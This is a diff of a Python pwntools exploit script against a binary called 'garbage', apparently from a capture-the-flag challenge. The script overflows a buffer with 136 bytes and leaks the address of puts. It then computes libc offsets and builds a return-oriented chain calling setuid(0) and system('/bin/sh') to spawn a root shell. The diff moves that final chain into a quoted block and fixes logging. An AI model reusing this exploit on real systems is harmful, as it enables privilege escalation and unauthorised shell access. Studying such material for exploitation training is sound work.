@@ -1,5 +1,6 @@
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
 from pwn import *
-
 
 # If the exploit is executed locally use the terminal configuration and gdb.debug
 io = gdb.debug(['./garbage'], 'break main')
@@ -10,7 +11,7 @@ io = gdb.debug(['./garbage'], 'break main')
 # io = s.process('/path/to/the/binary')
 
 context(os='linux', arch='amd64')
-# context.log_level = 'DEBUG'
+context.log_level = 'DEBUG'
 
 # Offset to %rsp is 136. encode() converts the string into bytes.
 junk = ("A" * 136).encode()
@@ -57,17 +58,15 @@ gadget_leak = pop_rdi + got_puts + plt_puts + plt_main
 
 io.sendline(junk + gadget_leak)
 # io.sendline('N3veRF3@r1iSh3r3!')
-
-# io.recvline()
 io.recvuntil('access denied.')
 
 # We leaked the address of PUTS within LIBC <puts@GLIBC_2.2.5>
 leaked_put = io.recv()[:8].strip().ljust(8, b'\x00')
 log.info(f'Leaked Address: {leaked_put.hex()}')
 
-
+# The offset between put@leaked and put@glibc 
 offset = u64(leaked_put) - u64(libc_puts)
-log.info(f'Offsset: {offset}')
+log.info(f'Offset: {offset}')
 
 # Little endian for the exploit
 system_loc = (u64(libc_system) + offset).to_bytes(8, byteorder='little')
@@ -78,7 +77,19 @@ binsh_loc = (u64(libc_binsh) + offset).to_bytes(8, byteorder='little')
 system_loc = (u64(libc_system) + offset).to_bytes(8, byteorder='big')
 setuid_loc = (u64(libc_setuid) + offset).to_bytes(8, byteorder='big')
 binsh_loc = (u64(libc_binsh) + offset).to_bytes(8, byteorder='big')
+'''
+log.info(f'System : {system_loc.hex()}')
+log.info(f'setuid : {setuid_loc.hex()}')
+log.info(f'/bin/sh : {binsh_loc.hex()}')
 
+# Gadget to Code Exec 
+gadget_rce = pop_rdi + p64(0) + setuid_loc
+gadget_rce += pop_rdi + binsh_loc + system_loc
+
+io.sendline(junk + gadget_rce)
+io.interactive()
+
+'''
 # python3 exploit.py 
 [+] Starting local process '/usr/bin/gdbserver': pid 2474
 [*] running in new terminal: /usr/bin/gdb -q  "./garbage" -x "/tmp/pwnop36ngoa.gdb"
@@ -97,15 +108,3 @@ gef➤  x/x 0x00007f0e2c180cee
 gef➤  x/s 0x00007f0e2c180cee
 0x7f0e2c180cee:	"/bin/sh"
 '''
-
-log.info(f'System : {system_loc.hex()}')
-log.info(f'setuid : {setuid_loc.hex()}')
-log.info(f'/bin/sh : {binsh_loc.hex()}')
-
-# Gadget to Code Exec 
-gadget_rce = pop_rdi + p64(0) + setuid_loc
-gadget_rce += pop_rdi + binsh_loc + system_loc
-
-io.sendline(junk + gadget_rce)
-
-io.interactive()
